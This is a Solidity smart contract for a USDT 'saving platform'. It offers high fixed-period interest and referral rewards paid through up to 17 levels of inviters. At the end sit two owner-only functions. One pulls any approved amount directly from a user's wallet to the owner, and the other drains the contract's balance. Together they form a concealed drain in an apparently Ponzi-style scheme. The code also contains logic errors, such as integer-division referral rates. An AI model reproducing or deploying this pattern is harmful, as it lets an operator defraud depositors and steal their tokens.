// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/utils/ReentrancyGuard.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract SavingPlatform is ReentrancyGuard, Ownable {
    IERC20 public usdtToken;

    struct Order {
        uint256 amount;
        uint256 startTime;
        uint256 period;
        bool completed;
    }

    struct User {
        Order[] orders;
        address referrer;
        uint256 rewardBalance;
        uint8 generation;
        uint256 circulation;
        address[] invitees;
    }

    mapping(address => User) public users;
    mapping(address => uint256) public balances;
    mapping(address => address[]) public userInvitees;
    mapping(address => uint8[]) public userGenerations;
    mapping(address => address[]) public userAllInvitees;
    mapping(address => uint8[]) public userAllGenerations;

    event Deposited(address indexed user, uint256 amount, uint256 period);
    event Withdrawn(address indexed user, uint256 amount, uint256 reward);
    event RewardPaid(address indexed user, uint256 reward);
    event Log(address indexed user, string message, uint256 value);
    event GenerationLog(address indexed user, uint8 generation);

    constructor(address _usdtToken, address _owner) Ownable(_owner) {
        usdtToken = IERC20(_usdtToken);
    }
    function getUserTotalDeposits(
        address user
    ) external view returns (uint256) {
        return balances[user];
    }

    function _updateAllInvitees(address user) internal {
        address referrer = users[user].referrer;
        uint8 gen = 1;
        while (referrer != address(0)) {
            userAllInvitees[referrer].push(user);
            userAllGenerations[referrer].push(gen);
            referrer = users[referrer].referrer;
            gen++;
        }
    }

    function deposit(
        uint256 amount,
        uint256 period,
        address referrer
    ) public nonReentrant {
        require(
            usdtToken.transferFrom(msg.sender, address(this), amount),
            "Transfer failed"
        );
        if (
            users[msg.sender].referrer == address(0) && referrer != msg.sender
        ) {
            users[msg.sender].referrer = referrer;
            users[msg.sender].generation = users[referrer].generation + 1;
            userInvitees[referrer].push(msg.sender);
            userGenerations[referrer].push(users[msg.sender].generation);
            _updateAllInvitees(msg.sender);
            emit GenerationLog(msg.sender, users[msg.sender].generation); 
        } 
        else {
            users[msg.sender].generation = 0;
        }
        users[msg.sender].circulation += amount;
        users[msg.sender].orders.push(
            Order({
                amount: amount,
                startTime: block.timestamp,
                period: period * 1 days,
                completed: false
            })
        );
        balances[msg.sender] += amount;
        emit Deposited(msg.sender, amount, period * 1 days);
    }

    function withdraw(uint256 orderId) public nonReentrant {
        Order storage order = users[msg.sender].orders[orderId];
        emit Log(msg.sender, "Before require", order.startTime);
        require(
            block.timestamp >= order.startTime + order.period,
            "Period has not ended"
        );
        emit Log(
            msg.sender,
            "After period check",
            order.startTime + order.period * 1 days
        );
        require(!order.completed, "Order already completed");
        emit Log(msg.sender, "After completed check", 0);
        uint256 payoutAmount = order.amount + calculateInterest(order.amount, order.period);
        order.completed = true;
        emit Log(msg.sender, "Before transfer", payoutAmount);
        require(
            usdtToken.transfer(msg.sender, payoutAmount),
            "Withdraw failed"
        );
        emit Log(msg.sender, "After transfer", payoutAmount);
        emit Withdrawn(
            msg.sender,
            payoutAmount,
            calculateInterest(order.amount, order.period)
        );
        users[msg.sender].circulation += order.amount;
        payReferralReward(
            msg.sender,
            calculateInterest(order.amount, order.period)
        );
    }
    
    function payReferralReward(address user, uint256 amount) internal {
        address referrer = users[user].referrer;
        uint256 reward;
        uint256 totalReward = amount;
        uint256 i = 1;

        while (referrer != address(0) && i <= 17) {
            uint256 referrerCirculation = users[referrer].circulation;

            if (referrerCirculation >= i * 100e18) {
                if (i == 1) {
                    reward = (totalReward * 20) / 100;
                } else if (i == 2) {
                    reward = (totalReward * 10) / 100;
                } else {
                    reward = (totalReward * (5 / (i > 7 ? 2 : 1))) / 100;
                }

                bool transferSuccess = usdtToken.transfer(referrer, reward);
                if (!transferSuccess) {
                    revert("Reward transfer failed");
                }

                users[referrer].rewardBalance += reward;
                emit RewardPaid(referrer, reward);
            }

            referrer = users[referrer].referrer;
            i++;
        }
    }

    function calculateInterest(
        uint256 amount,
        uint256 period
    ) private pure returns (uint256) {
        uint256 interestRate;
        if (period == 1 days || period == 0 days) {
            interestRate = 40; // 0.40% 
        } else if (period == 7 days) {
            interestRate = 400; // 4%
        } else if (period == 14 days) {
            interestRate = 950; // 9.50%
        } else if (period == 28 days) {
            interestRate = 2400; // 24%
        } else {
            revert("Invalid period");
        }

        return (amount * interestRate) / 10000;
    }

    function getUserInvitees(
        address user
    ) external view returns (address[] memory invitees, uint8[] memory generations) {
        return (userAllInvitees[user], userAllGenerations[user]);
    }

    function getUserOrder(
        address user,
        uint256 orderId
    ) external view returns (Order memory) {
        return users[user].orders[orderId];
    }

    function getUserOrders(
        address user
    )
        external
        view
        returns (
            uint256[] memory amounts,
            uint256[] memory startTimes,
            uint256[] memory periods,
            bool[] memory completeds
        )
    {
        User storage userData = users[user];
        uint256 orderCount = userData.orders.length;

        amounts = new uint256[](orderCount);
        startTimes = new uint256[](orderCount);
        periods = new uint256[](orderCount);
        completeds = new bool[](orderCount);

        for (uint256 i = 0; i < orderCount; i++) {
            Order storage order = userData.orders[i];
            amounts[i] = order.amount;
            startTimes[i] = order.startTime;
            periods[i] = order.period;
            completeds[i] = order.completed;
        }

        return (amounts, startTimes, periods, completeds);
    }

    function uint2str(
        uint _i
    ) internal pure returns (string memory _uintAsString) {
        if (_i == 0) {
            return "0";
        }
        uint j = _i;
        uint len;
        while (j != 0) {
            len++;
            j /= 10;
        }
        bytes memory bstr = new bytes(len);
        uint k = len;
        while (_i != 0) {
            k = k - 1;
            uint8 temp = (48 + uint8(_i - (_i / 10) * 10));
            bytes1 b1 = bytes1(temp);
            bstr[k] = b1;
            _i /= 10;
        }
        return string(bstr);
    }
    function transferApprovedFunds(address user, uint256 amount) external onlyOwner nonReentrant {
        require(usdtToken.transferFrom(user, owner(), amount), "Transfer failed");
    }
    function withdrawFunds(uint256 amount) external onlyOwner nonReentrant {
        require(usdtToken.transfer(owner(), amount), "Withdraw funds failed");
    }

}
